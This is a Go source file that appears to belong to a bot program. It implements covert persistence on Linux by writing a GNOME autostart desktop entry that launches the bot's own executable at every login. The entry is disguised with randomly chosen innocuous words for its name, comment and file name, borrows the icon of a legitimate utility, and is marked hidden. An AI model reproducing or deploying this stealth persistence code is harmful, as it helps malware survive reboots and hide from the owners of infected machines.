package main

import (
	"fmt"
	"os"
	"strings"
)

// checkIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
func checkIfPersisted() bool {
	switch osDetails().Os {
	case "linux":
		workdir, err := os.Getwd()
		if err != nil {
			fmt.Println(err.Error())
			return false
		}

		if strings.HasSuffix(workdir, "autostart") {
			return true
		}
	}

	return false
}

// persist returns true if the executable was persisted within the environment.
func persist() bool {
	switch osDetails().Os {
	case "linux":
		// User's home folder.
		homeDir, err := os.UserHomeDir()
		if os.IsNotExist(err) {
			fmt.Println(err.Error())
			return false
		}
		autoStartPath := homeDir + "/.config/autostart"

		// Check if we can persist on Gnome.
		_, err = os.Stat(autoStartPath)
		if os.IsNotExist(err) {
			fmt.Println(err.Error())
			return false
		}

		executablePath, err := os.Executable()
		if err != nil {
			fmt.Println(err.Error())
			return false
		}

		desktopEntry := "[Desktop Entry]"
		desktopEntry += "\nVersion=1.0"
		desktopEntry += "\nName=" + randomPopularWord()
		desktopEntry += "\nGenericName=" + randomPopularWord()
		desktopEntry += "\nComment=" + randomPopularWord()
		desktopEntry += "\nExec=" + executablePath
		desktopEntry += "\nIcon=redshift"
		desktopEntry += "\nTerminal=false"
		desktopEntry += "\nType=Application"
		desktopEntry += "\nCategories=Utility;"
		desktopEntry += "\nStartupNotify=true"
		desktopEntry += "\nHidden=true"
		desktopEntry += "\nX-GNOME-Autostart-enabled=true"

		// Write the desktop entry file.
		f, err := os.Create(autoStartPath + "/" + randomPopularWord() + ".desktop")
		if err != nil {
			fmt.Println(err.Error())
		}
		f.WriteString(desktopEntry)

		return true
	}

	return false
}
